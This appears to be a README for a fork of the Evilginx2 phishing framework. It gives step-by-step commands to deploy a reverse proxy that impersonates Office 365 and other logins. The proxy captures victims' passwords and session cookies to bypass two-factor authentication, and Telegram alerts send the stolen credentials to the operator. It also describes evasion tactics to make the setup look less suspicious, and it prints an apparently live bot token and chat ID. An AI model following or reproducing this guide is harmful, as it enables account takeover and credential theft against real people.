<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/logo.png" alt="Evilginx2 Logo" width="180"/>
</p>


---

- [📋 Chapter 3: System Requirements](#-chapter-3-system-requirements)
- [📦 Chapter 4: Prerequisites (What You Need Before Starting)](#-chapter-4-prerequisites-what-you-need-before-starting)
- [🖥️ PHASE 1: Server Preparation](#-phase-1-server-preparation)
- [☕ PHASE 2: Install Go Programming Language](#-phase-2-install-go-programming-language)
- [☁️ PHASE 3: Cloudflare DNS Setup (Critical for SSL)](#-phase-3-cloudflare-dns-setup-critical-for-ssl)
- [🔧 PHASE 4: Clone & Build Evilginx2](#-phase-4-clone--build-evilginx2)
- [⚙️ PHASE 5: Evilginx2 Console Configuration](#-phase-5-evilginx2-console-configuration)
- [📱 PHASE 6: Telegram Integration](#-phase-6-telegram-integration)
- [🎣 PHASE 7: Phishlets & Lures](#-phase-7-phishlets--lures)
- [🔄 PHASE 8: Systemd Service (Auto-Start on Boot)](#-phase-8-systemd-service-auto-start-on-boot)
- [📊 PHASE 9: Web Dashboard](#-phase-9-web-dashboard)
- [🐳 PHASE 10: Docker Deployment](#-phase-10-docker-deployment)
- [✅ PHASE 11: Testing Your Setup](#-phase-11-testing-your-setup)
- [🧠 PHASE 12: Pro Tips & Advanced Features](#-phase-12-pro-tips--advanced-features)
- [📝 Full Command Cheat Sheet](#-full-command-cheat-sheet)
- [🔧 Troubleshooting](#-troubleshooting)
- [🧩 Inside the Code — Architecture Deep Dive](#-inside-the-code--architecture-deep-dive)
- [📂 Complete File Reference](#-complete-file-reference)
- [👏 Credits & Support](#-credits--support)

<br>

---

<br>

# 🧠 Chapter 1: What Is Evilginx2?

Imagine you are standing **between** two people — Person A (your target) and Person B (a real website like Microsoft Office 365). Everything Person A says to Person B, you hear. Everything Person B says back, you hear. And you can **change** the messages before passing them along.

**That's exactly what Evilginx2 does.**

Evilginx2 is a **man-in-the-middle (MITM) attack framework** used for authorized penetration testing and security assessments. It acts as a **reverse proxy** between a victim and a real website (like Office 365, Google, LinkedIn, Facebook, etc.).

<br>

## The Simple Picture

```
                        ┌──────────────────────────┐
                        │      YOUR VICTIM         │
                        │  (opens an email link)   │
                        └─────────────┬────────────┘
                                      │
                                      ▼
                  ┌─────────────────────────────────────┐
                  │       YOUR EVILGINX SERVER          │
                  │                                     │
                  │   "Hello! Let me forward you to     │
                  │    the real login page..."          │
                  └──────┬──────────────────────┬───────┘
                         │                      │
                         ▼                      ▼
              ┌────────────────────┐  ┌────────────────────┐
              │  WHAT GETS STOLEN │  │  REAL WEBSITE      │
              │                    │  │                    │
              │  ✓ Email/Username │  │  (e.g., Office 365)│
              │  ✓ Password       │  │                    │
              │  ✓ Session Cookie │  │  Victim logs in    │
              │    (bypasses 2FA) │  │  successfully      │
              │  ✓ 2FA Code       │  └────────────────────┘
              └────────┬──────────┘
                       │
                       ▼
        ┌─────────────────────────────────────┐
        │  YOU GET INSTANT NOTIFICATION:      │
        │                                     │
        │  📱 Telegram Message                │
        │  📊 Web Dashboard                   │
        │  💾 Saved to Database               │
        └─────────────────────────────────────┘
```

<br>

## What This Means In Real Life

When a victim types their credentials on a phishing page served by Evilginx2:

1. **Evilginx2 forwards** the credentials to the REAL website (Microsoft, Google, etc.)
2. **The real login succeeds** — the victim sees a normal login page, no errors
3. **The real website sends back** a session cookie (this is what bypasses 2FA)
4. **Evilginx2 steals** that cookie AND sends it to you
5. **You get an instant Telegram message** with the username, password, and cookie file
6. **You import the cookie** into your browser — and you're logged in as that user, **without needing their 2FA code**

<br>

---

<br>

# ✨ Chapter 2: What's Special About This Fork?

This version by **@officialmonsterz** adds powerful features on top of the original Evilginx3 v3.3.0. Think of it as **taking a great tool and giving it a turbo upgrade**.

<br>

## Feature Comparison Table

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                                     FEATURE TABLE                                           │
├────────────────────────────────────────────────┬──────────────────────────┬──────────────────────────────────┤
│                    FEATURE                     │     ORIGINAL EVILGINX3   │    THIS FORK (TELEGRAM EDITION)  │
├────────────────────────────────────────────────┼──────────────────────────┼──────────────────────────────────┤
│ 📱 Telegram Notifications                      │  ❌ Not available        │  ✅ Instant alerts on capture     │
│ 📎 Token .txt File Attachments                 │  ❌ Not available        │  ✅ Tokens as downloadable files  │
│ 🔄 Auto-Updating Messages                      │  ❌ Not available        │  ✅ Edits existing message        │
│ ⏳ Async Notification Queue                    │  ❌ Not available        │  ✅ Non-blocking delivery         │
│ 📊 Web Dashboard (port 5000)                   │  ❌ Not available        │  ✅ Full HTML UI + REST API       │
│ 💾 BuntDB Database (embedded)                  │  ❌ Plain text logs      │  ✅ Zero-config, no SQL needed    │
│ 📤 CSV/JSON Export                             │  ❌ Not available        │  ✅ One-click export              │
│ 🔍 Session Search & Filter                     │  ❌ Not available        │  ✅ Search by any field           │
│ 🌙 Dark Mode UI                                │  ❌ Not available        │  ✅ Toggleable dark/light mode    │
│ 🔐 Dashboard Auth (Basic Auth)                 │  ❌ Not available        │  ✅ Username/password protection  │
│ 🐳 Docker Multi-Stage (~18MB)                  │  ❌ Single-stage, huge   │  ✅ Minimal Alpine image          │
│ 📁 Auto-Export to JSON/CSV                     │  ❌ Not available        │  ✅ Auto-save every session       │
│ 🧹 Delete Sessions (Dashboard + API)           │  ❌ Not available        │  ✅ Remove from UI or API         │
└────────────────────────────────────────────────┴──────────────────────────┴──────────────────────────────────┘
```

<br>

## What Each Feature Does (In Plain English)

| Feature | What It Means For You |
|:--------|:----------------------|
| **📱 Telegram Alerts** | As soon as someone types their password, you get a message on your phone. No need to watch a terminal screen. |
| **📎 Token File** | The cookies come as a `.txt` file you can import into Chrome/Firefox. Just click and you're in. |
| **🔄 No Spam** | If more cookies are found later, the SAME Telegram message is updated. Your chat stays clean. |
| **📊 Web Dashboard** | A nice webpage where you can see ALL captured sessions. Search, filter, export, delete. |
| **💾 BuntDB** | All data saves automatically in a single file. No need to install MySQL or PostgreSQL. |

<br>

---

<br>

# 📋 Chapter 3: System Requirements

## Minimum Server Requirements

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         MINIMUM SERVER REQUIREMENTS                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  🔹 CPU:      1 core (2 cores recommended)                                 │
│  🔹 RAM:      512 MB (1 GB recommended)                                    │
│  🔹 Storage:  10 GB free space                                             │
│  🔹 OS:       Ubuntu 20.04 / 22.04 / 24.04 LTS OR Debian 11 / 12          │
│  🔹 Network:  Public IP address (static)                                   │
│  🔹 Ports:    22 (SSH), 53 (DNS), 80 (HTTP), 443 (HTTPS), 5000 (Dashboard)│
│                                                                             │
│  📌 RECOMMENDED: A $5-10/month VPS from DigitalOcean, Vultr,              │
│     Hetzner, or any cloud provider works perfectly.                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

<br>

---

<br>

# 📦 Chapter 4: Prerequisites (What You Need Before Starting)

Before you begin, make sure you have **all** of these ready:

<br>

## Checklist

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         PREREQUISITES CHECKLIST                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ☐  1. A VPS server (Ubuntu 20.04+) with root/SSH access                  │
│                                                                             │
│  ☐  2. A domain name (e.g., mytestdomain.com)                             │
│        • Buy from Namecheap, GoDaddy, Porkbun, etc. ($1-10/year)          │
│        • Example: "secure-login-page.com" or any unused domain            │
│                                                                             │
│  ☐  3. A Cloudflare account (free tier)                                   │
│        • Go to cloudflare.com and sign up                                  │
│        • Add your domain to Cloudflare                                     │
│                                                                             │
│  ☐  4. A Telegram account                                                 │
│        • Download Telegram on your phone                                   │
│                                                                             │
│  ☐  5. Basic familiarity with SSH terminal                                │
│        • You'll copy-paste commands — no coding required                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║   ██████  ██   ██  █████  ███████ ███████      ██  ██████                 ║
║   ██   ██ ██   ██ ██   ██ ██      ██           ██ ██                      ║
║   ██████  ███████ ███████ ███████ ███████      ██ ██                      ║
║   ██      ██   ██ ██   ██      ██      ██      ██ ██                      ║
║   ██      ██   ██ ██   ██ ███████ ███████      ██  ██████                 ║
║                                                                            ║
║                    PHASE 1: SERVER PREPARATION                            ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# 🖥️ PHASE 1: Server Preparation

**Goal:** Set up your server so it's ready to run Evilginx2.

<br>

## Step 1.1: Connect to Your Server via SSH

SSH (Secure Shell) is how you remotely control your server. Your hosting provider should have given you:

- **Server IP address** (e.g., `173.44.141.147`)
- **Root password** or **SSH key**

Open a terminal (on Mac/Linux) or PowerShell (on Windows) and type:

```bash
ssh root@173.44.141.147
```

> **Replace `173.44.141.147` with your actual server IP.**

The first time you connect, you'll see:
```
The authenticity of host '173.44.141.147 (173.44.141.147)' can't be established.
Are you sure you want to continue connecting (yes/no)?
```

Type `yes` and press Enter. Then enter your password (you won't see characters as you type — that's normal).

<br>

## Step 1.2: Update Your Server

This ensures your server has the latest security patches and software packages.

```bash
sudo apt update && sudo apt upgrade -y
```

> **What this does:** `apt update` checks for available updates. `apt upgrade -y` installs them. The `-y` means "answer yes to any prompts."

<br>

## Step 1.3: Install Essential Software Packages

```bash
sudo apt install nano wget curl git make build-essential screen fail2ban htop net-tools ufw -y
```

### What Each Package Does

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         PACKAGE EXPLANATIONS                                │
├──────────────────────┬──────────────────────────────────────────────────────┤
│        PACKAGE       │                     PURPOSE                          │
├──────────────────────┼──────────────────────────────────────────────────────┤
│  nano                │ Simple text editor — like Notepad for the terminal   │
│  wget                │ Downloads files from the internet                    │
│  curl                │ Tests connections and APIs                           │
│  git                 │ Downloads code from GitHub                           │
│  make                │ Helps build (compile) programs                       │
│  build-essential     │ Tools needed for compiling Go code                   │
│  screen              │ Lets you run programs in the background              │
│  fail2ban            │ Blocks hackers trying to guess your SSH password    │
│  htop                │ Shows what your server is doing (like Task Manager) │
│  net-tools           │ Network diagnostic utilities                         │
│  ufw                 │ Firewall — controls which ports are open             │
└──────────────────────┴──────────────────────────────────────────────────────┘
```

<br>

## Step 1.4: Configure the Firewall (UFW)

Your server needs certain **ports** open for Evilginx2 to work. Think of ports like doors — you need to unlock the right ones.

```bash
sudo ufw allow 22/tcp     # SSH — lets you connect to the server
sudo ufw allow 53/udp     # DNS — needed for SSL certificate verification
sudo ufw allow 80/tcp     # HTTP — needed for SSL certificate verification
sudo ufw allow 443/tcp    # HTTPS — where your phishing pages live
sudo ufw allow 5000/tcp   # Dashboard — the web interface
sudo ufw --force enable   # Turn on the firewall
```

### Verify Your Firewall Is Set Up Correctly

```bash
sudo ufw status
```

**Expected output:**

```
Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
53/udp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
443/tcp                    ALLOW       Anywhere
5000/tcp                   ALLOW       Anywhere
```

> **If you see something different:** Run the `ufw allow` commands again. Make sure you didn't miss one.

<br>

## Step 1.5: Fix the DNS Port Conflict

This is a **very common problem** that trips people up. Here's what's happening:

Ubuntu has a built-in service called `systemd-resolved` that uses **port 53** for DNS. Evilginx2 ALSO needs port 53 for its DNS server. They can't both use it at the same time.

**We need to disable the built-in DNS resolver:**

```bash
# Step A: Stop the built-in DNS resolver immediately
sudo systemctl stop systemd-resolved

# Step B: Prevent it from starting again on reboot
sudo systemctl disable systemd-resolved

# Step C: Remove the current DNS configuration file
sudo rm -f /etc/resolv.conf

# Step D: Set Cloudflare as your DNS servers (fast and reliable)
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf

# Step E: Lock the file so nothing can overwrite it
sudo chattr +i /etc/resolv.conf
```

### What Each Command Does

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DNS PORT FIX — EXPLANATION                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  📌 The Problem:                                                           │
│  systemd-resolved uses port 53. Evilginx2 needs port 53.                   │
│  They conflict. One must go.                                                │
│                                                                             │
│  📌 The Solution:                                                         │
│  We disable systemd-resolved and tell the server to use Cloudflare's        │
│  DNS servers (1.1.1.1 and 1.0.0.1) directly.                               │
│                                                                             │
│  📌 Why Cloudflare DNS?                                                    │
│  It's fast, free, and reliable. Your server uses it to look up domain      │
│  names when it needs to connect to the internet.                           │
│                                                                             │
│  📌 Why "chattr +i"?                                                      │
│  This makes the file "immutable" — nothing can change it, not even root.   │
│  This prevents any program from accidentally overwriting our DNS settings. │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

<br>

## Step 1.6: Reboot Your Server

This ensures everything is clean and all changes take effect.

```bash
sudo reboot
```

> **Wait 30-60 seconds**, then reconnect via SSH:
> ```bash
> ssh root@173.44.141.147
> ```

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║    ██████   ██   ██  █████  ███████ ███████       ██████                   ║
║    ██   ██  ██   ██ ██   ██ ██      ██           ██   ██                  ║
║    ██████   ███████ ███████ ███████ ███████      ██████                    ║
║    ██   ██  ██   ██ ██   ██      ██      ██      ██   ██                  ║
║    ██████   ██   ██ ██   ██ ███████ ███████      ██████                    ║
║                                                                            ║
║                 PHASE 2: INSTALL GO PROGRAMMING LANGUAGE                   ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# ☕ PHASE 2: Install Go Programming Language

**Goal:** Install Go (version 1.22.5) — the programming language Evilginx2 is written in.

Evilginx2 is written in **Go** (also called Golang). We need to install it so we can compile (build) the Evilginx2 program from source code.

<br>

## Step 2.1: Download Go

```bash
cd ~
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
```

> **What this does:** Downloads the Go 1.22.5 package to your home directory. The file is about 70MB.

<br>

## Step 2.2: Remove Any Old Go Installation

```bash
sudo rm -rf /usr/local/go
```

> **What this does:** Removes any previous Go installation (if one exists). We want a clean install.

<br>

## Step 2.3: Extract Go to the Installation Directory

```bash
sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
```

> **What this does:** Unpacks Go into `/usr/local/go` — the standard location for Go on Linux.

<br>

## Step 2.4: Add Go to Your PATH

The "PATH" is a list of directories where your system looks for executable programs. We need to tell it where Go lives.

```bash
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
```

> **What this does:**
> - `~/.bashrc` is a file that runs every time you open a terminal
> - We add Go's directory to the PATH so you can type `go` from anywhere
> - `source ~/.bashrc` applies the change immediately

<br>

## Step 2.5: Verify Go Is Installed

```bash
go version
```

**Expected output:**
```
go version go1.22.5 linux/amd64
```

> **If you see a different version or an error:** Go back to Step 2.1 and try again. Make sure you downloaded the correct file.

<br>

## Step 2.6: Clean Up the Download

```bash
rm go1.22.5.linux-amd64.tar.gz
```

> **What this does:** Removes the downloaded .tar.gz file (we don't need it anymore after extraction).

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║     ██████  ██       ██████  ██    ██ ██████  ███████  ██████  ██          ║
║    ██      ██      ██    ██ ██    ██ ██   ██ ██      ██    ██ ██          ║
║    ██      ██      ██    ██ ██    ██ ██████  █████   ██    ██ ██          ║
║    ██      ██      ██    ██ ██    ██ ██   ██ ██      ██    ██ ██          ║
║     ██████ ███████  ██████   ██████  ██   ██ ███████  ██████  ███████     ║
║                                                                            ║
║                   PHASE 3: CLOUDFLARE DNS SETUP                           ║
║                         (CRITICAL FOR SSL)                                 ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# ☁️ PHASE 3: Cloudflare DNS Setup (Critical for SSL)

**Goal:** Point your domain to your server through Cloudflare so SSL certificates work.

> **⚠️ This is the MOST IMPORTANT phase.** If you mess this up, SSL certificates will fail and your phishing pages won't load. **Read each step carefully.**

<br>

## Step 3.1: Add Your Domain to Cloudflare

1. Go to [cloudflare.com](https://cloudflare.com) and log in (or create a free account)
2. Click **"Add a Site"** button
3. Enter your domain name (e.g., `entreexampdremd.online`)
4. Click **"Add Site"**
5. Select the **Free** plan
6. Cloudflare will scan your existing DNS records (there probably aren't any yet)
7. **IMPORTANT:** Write down the two nameservers Cloudflare gives you. They look like:
   - `arya.ns.cloudflare.com`
   - `matt.ns.cloudflare.com`

<br>

## Step 3.2: Change Nameservers at Your Domain Registrar

Your "registrar" is where you bought your domain (Namecheap, GoDaddy, Porkbun, etc.).

1. Log in to your registrar's website
2. Find **DNS Settings** or **Nameservers**
3. Change from "Default" or "Registrar's DNS" to **Custom Nameservers**
4. Enter the **two Cloudflare nameservers** from Step 3.1
5. Save the changes

> **DNS propagation takes 5-15 minutes** (sometimes up to 24 hours, but usually much faster).

<br>

## Step 3.3: Add DNS Records in Cloudflare

**⚠️ CRITICAL:** Set all records to **DNS Only** (grey cloud icon), **NOT** Proxy (orange cloud). Evilginx2 needs direct connections to ports 80 and 443.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         DNS RECORDS TO ADD                                  │
├──────────┬──────────┬─────────────────────────┬─────────────────────────────┤
│   TYPE   │   NAME   │       CONTENT           │       PROXY STATUS          │
├──────────┼──────────┼─────────────────────────┼─────────────────────────────┤
│    A     │    @     │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
│    A     │  login   │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
│    A     │  admin   │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
│    A     │    *     │   173.44.141.147        │   ❌ DNS Only (grey cloud) │
└──────────┴──────────┴─────────────────────────┴─────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    WHAT EACH DNS RECORD DOES                                │
├──────────┬──────────────────────────────────────────────────────────────────┤
│  RECORD  │  PURPOSE                                                         │
├──────────┼──────────────────────────────────────────────────────────────────┤
│    @     │  The root domain — needed for base configuration                 │
│  login   │  Where your phishing page lives (login.yourdomain.com)           │
│  admin   │  For accessing the web dashboard (admin.yourdomain.com:5000)     │
│    *     │  Wildcard — catches ANY subdomain you might use later            │
└──────────┴──────────────────────────────────────────────────────────────────┘
```

<br>

## Step 3.4: Configure SSL/TLS Settings

In the Cloudflare dashboard:

1. Go to **SSL/TLS** → **Overview**
2. Set **SSL/TLS encryption level** to **Full** (NOT "Full Strict")
3. Go to **Edge Certificates** tab
4. Turn **Always Use HTTPS** → **ON**

<br>

## Step 3.5: Verify DNS Propagation

Check that your DNS records are working:

```bash
dig @1.1.1.1 entreexampdremd.online +short
dig @1.1.1.1 login.entreexampdremd.online +short
```

Both commands should return your server's IP address (e.g., `173.44.141.147`).

> **If nothing is returned:** Wait 10-15 minutes and try again. DNS propagation takes time.

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║    ██████  ██   ██  ██████  ███    ██ ███████      ██████                  ║
║    ██      ██   ██ ██    ██ ████   ██ ██          ██   ██                  ║
║    ██      ███████ ██    ██ ██ ██  ██ █████       ██████                   ║
║    ██      ██   ██ ██    ██ ██  ██ ██ ██          ██   ██                  ║
║     ██████ ██   ██  ██████  ██   ████ ███████     ██████                   ║
║                                                                            ║
║                PHASE 4: CLONE & BUILD EVILGINX2                            ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# 🔧 PHASE 4: Clone & Build Evilginx2

**Goal:** Download the Evilginx2 source code and compile it into a working program.

<br>

## Step 4.1: Clone the Repository

"Cloning" means downloading a copy of the code from GitHub:

```bash
cd /root
git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2
```

> **What this does:** Downloads the entire project into a folder called `evilginx2` and navigates into it.

<br>

## Step 4.2: Clean Up (Optional, for Fresh Builds)

```bash
rm -rf vendor/ 2>/dev/null
```

> **What this does:** Removes any old dependency files (vendor directory). If the directory doesn't exist, the error is hidden (`2>/dev/null`).

<br>

## Step 4.3: Download Dependencies

```bash
go mod tidy
```

> **What this does:** Downloads all the Go packages that Evilginx2 needs to run. This might take 30-60 seconds.

<br>

## Step 4.4: Compile the Binary

```bash
go build -o evilginx2 .
```

> **What this does:** Compiles the Go source code into a single executable file called `evilginx2`. This is the actual program.

<br>

## Step 4.5: Make It Executable

```bash
chmod +x evilginx2
```

> **What this does:** Adds "execute" permission — allows the file to be run as a program.

<br>

## Step 4.6: Verify the Binary

```bash
ls -lh evilginx2
```

**Expected output:**
```
-rwxr-xr-x 1 root root 25M ... evilginx2
```

> The `25M` means the binary is 25 megabytes. If you see a much smaller number (like a few KB), something went wrong.

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║     ██████  ██   ██ ██    ██ ██ ███    ██  ██████                          ║
║    ██      ██   ██ ██    ██ ██ ████   ██ ██                               ║
║    ██      ███████ ██    ██ ██ ██ ██  ██ ██   ███                          ║
║    ██      ██   ██ ██    ██ ██ ██  ██ ██ ██    ██                          ║
║     ██████ ██   ██  ██████  ██ ██   ████  ██████                           ║
║                                                                            ║
║              PHASE 5: EVILGINX2 CONSOLE CONFIGURATION                      ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# ⚙️ PHASE 5: Evilginx2 Console Configuration

**Goal:** Configure Evilginx2 with your domain, IP, SSL settings, and more.

<br>

## Step 5.1: Start Evilginx2 with Dashboard

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
```

### What These Flags Mean

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      COMMAND LINE FLAGS EXPLAINED                           │
├───────────────────────────┬─────────────────────────────────────────────────┤
│           FLAG            │                    PURPOSE                       │
├───────────────────────────┼─────────────────────────────────────────────────┤
│  -dashboard 0.0.0.0:5000 │ Dashboard accessible on ALL network interfaces  │
│                           │ at port 5000.                                    │
├───────────────────────────┼─────────────────────────────────────────────────┤
│  -dashboard-user admin   │ Username to log into the dashboard               │
├───────────────────────────┼─────────────────────────────────────────────────┤
│  -dashboard-pass mypass  │ Password to log into the dashboard               │
│          1234             │ CHANGE THIS TO SOMETHING STRONG                 │
└───────────────────────────┴─────────────────────────────────────────────────┘
```

> **⚠️ IMPORTANT:** Change `mypass1234` to a strong, unique password!

You'll see the Evilginx console with a `:` prompt:

```
evilginx>
```

<br>

## Step 5.2: Set Your Domain

```
: config domain entreexampdremd.online
```

> **Replace `entreexampdremd.online` with YOUR actual domain.**

This tells Evilginx2 which domain to use for certificates and phishing pages.

<br>

## Step 5.3: Set Your Server's External IP

```
: config ipv4 external 173.44.141.147
```

> **Replace `173.44.141.147` with YOUR server's actual public IP address.**

This tells Evilginx2 which IP address to use in URLs and redirects.

<br>

## Step 5.4: Enable Automatic SSL Certificates

```
: config autocert on
```

This tells Evilginx2 to automatically get and renew **Let's Encrypt SSL certificates** for your domain. Without this, your phishing pages will show "Not Secure" warnings.

<br>

## Step 5.5: Set an "Unauthorized" Redirect URL

When someone visits your phishing domain **without** a valid lure link, they get sent here:

```
: config unauth_url https://www.google.com
```

> **Why this matters:** If a curious person types `https://login.yourdomain.com` directly (without the secret lure path), they get redirected to Google. This makes your setup look less suspicious.

<br>

## Step 5.6: Configure Blacklist Mode

```
: blacklist unauth
```

### Blacklist Mode Options

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         BLACKLIST MODES EXPLAINED                           │
├──────────────┬──────────────────────────────────────────────────────────────┤
│     MODE     │                     BEHAVIOR                                 │
├──────────────┼──────────────────────────────────────────────────────────────┤
│  off         │ No blacklisting — everyone gets through                       │
│  unauth      │ Blacklist IPs that visit without a valid lure token          │
│              │ (Recommended — blocks scanners and curious visitors)         │
│  all         │ Blacklist EVERY new visitor immediately                      │
│              │ (Very restrictive — might block your targets)                │
│  noadd       │ Check the blacklist, but don't add new IPs                   │
└──────────────┴──────────────────────────────────────────────────────────────┘
```

<br>

## Step 5.7: Verify All Settings

```
: config
```

**Expected output (example):**

```
domain             : entreexampdremd.online
external_ipv4      : 173.44.141.147
bind_ipv4          :
https_port         : 443
dns_port           : 53
unauth_url         : https://www.google.com
autocert           : on
gophish admin_url  :
gophish api_key    :
gophish insecure   : false
chatid             :
teletoken          :
```

> Notice **chatid** and **teletoken** are empty — we'll fill those in Phase 6!

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║    ████████ ███████  ██      ███████  ██████  ██████   █████  ███    ██   ║
║       ██    ██      ██      ██      ██      ██   ██ ██   ██ ████   ██   ║
║       ██    █████   ██      █████   ██      ██████  ███████ ██ ██  ██   ║
║       ██    ██      ██      ██      ██      ██   ██ ██   ██ ██  ██ ██   ║
║       ██    ███████ ███████ ███████  ██████ ██   ██ ██   ██ ██   ████   ║
║                                                                            ║
║                    PHASE 6: TELEGRAM INTEGRATION                          ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# 📱 PHASE 6: Telegram Integration

**Goal:** Connect Evilginx2 to Telegram so you get instant notifications when credentials are captured.

> **This is the flagship feature of this fork.** When someone submits credentials, you'll get a message on your phone within seconds.

<br>

## Step 6.1: Create a Telegram Bot

Telegram bots are automated accounts that can send you messages. We need one to deliver the captured credentials.

1. Open Telegram on your phone or desktop
2. Search for **@BotFather** (it's Telegram's official bot creator)
3. Start a chat and send: `/newbot`
4. BotFather will ask for a **display name** — choose something like `My Security Notifier`
5. Then it asks for a **username** — must end in `_bot`, for example `my_evilginx_bot`
6. **BotFather will give you a token.** It looks like this:

```
8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
```

> **⚠️ COPY THIS TOKEN AND KEEP IT SAFE.** Anyone with this token can control your bot.

<br>

## Step 6.2: Test Your Bot Token Immediately

Before we go further, let's verify the token works:

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getMe"
```

**Expected response (formatted):**
```json
{
  "ok": true,
  "result": {
    "id": 8863425004,
    "is_bot": true,
    "first_name": "My Security Notifier",
    "username": "my_evilginx_bot"
  }
}
```

> **If you get `"ok": false`:** Your token is wrong. Go back to BotFather and get the correct token.

<br>

## Step 6.3: Get Your Chat ID

Your "Chat ID" is like your Telegram address. It tells the bot where to send messages.

**First:** Search for your bot on Telegram: `@my_evilginx_bot` and send it any message (like "Hello").

**Then run this command:**

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getUpdates"
```

**Expected response (snippet):**
```json
{
  "ok": true,
  "result": [
    {
      "message": {
        "chat": {
          "id": 7545456339,
          "first_name": "Draconian"
        }
      }
    }
  ]
}
```

> **`7545456339` is YOUR Chat ID.** Write it down. If `result` is empty `[]`, you haven't messaged your bot yet — send it a message first!

<br>

## Step 6.4: Test Sending a Message

Let's verify everything works by sending a test message:

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/sendMessage?chat_id=7545456339&text=Hello%20from%20Evilginx"
```

You should receive **"Hello from Evilginx"** in your Telegram chat within seconds.

<br>

## Step 6.5: Configure Telegram in Evilginx Console

Now enter these commands in Evilginx console (where you see the `evilginx>` prompt):

```
: config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
: config chatid 7545456339
```

> **Replace the token and chat ID with YOUR values.**

<br>

## Step 6.6: Test Telegram from Inside Evilginx

```
: test telegram
```

**If successful, you'll see:**
```
Telegram test message sent successfully!
```

And you'll receive a formatted test message in Telegram.

> **If it fails:** Double-check your token and chat ID. Make sure the bot can message you.

<br>

---

<br>

<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║    ██████   ██   ██  ██  ███████  ██   ██  ██      ███████ ████████      ║
║    ██   ██  ██   ██  ██  ██       ██   ██  ██      ██         ██         ║
║    ██████   ███████  ██  ███████  ███████  ██      █████      ██         ║
║    ██       ██   ██  ██       ██  ██   ██  ██      ██         ██         ║
║    ██       ██   ██  ██  ███████  ██   ██  ███████ ███████    ██         ║
║                                                                            ║
║                    PHASE 7: PHISHLETS & LURES                             ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

# 🎣 PHASE 7: Phishlets & Lures

**Goal:** Set up the phishing page and create a URL to send to your targets.

<br>

## Step 7.1: What Are Phishlets?

A **phishlet** is a YAML configuration file that tells Evilginx2 how to proxy a specific website (like Office 365, Google, or LinkedIn). Each phishlet defines:

- Which subdomain to use (e.g., `login.yourdomain.com`)
- Which URLs to proxy
- Where to find the login form
- Which cookies and tokens to capture

Think of a phishlet as a **template** for cloning a specific website.

<br>

## Step 7.2: List Available Phishlets

```
: phishlets
```

This shows all phishlets found in the `/root/evilginx2/phishlets/` directory.

You'll see something like:
```
+--------------------+----------+------------------+
|     Phishlet       |  Status  |   Hostname       |
+--------------------+----------+------------------+
| office365          | disabled |                  |
| google             | disabled |                  |
| linkedin           | disabled |                  |
| facebook           | disabled |                  |
| instagram          | disabled |                  |
+--------------------+----------+------------------+
```

<br>

## Step 7.3: Set Hostname for a Phishlet

A hostname tells the phishlet which subdomain to use:

```
: phishlets hostname office365 entreexampdremd.online
```

> **What this does:** The Office 365 phishlet will use `login.entreexampdremd.online` (the phishlet's YAML file defines which subdomain prefix, like `login`, to use).

<br>

## Step 7.4: Enable the Phishlet

```
: phishlets enable office365
```

**Expected output:**
```
phishlet 'office365' enabled on hostname 'login.entreexampdremd.online'
```

> **Now** anyone who visits `https://login.entreexampdremd.online` will see the Office 365 login page.

<br>

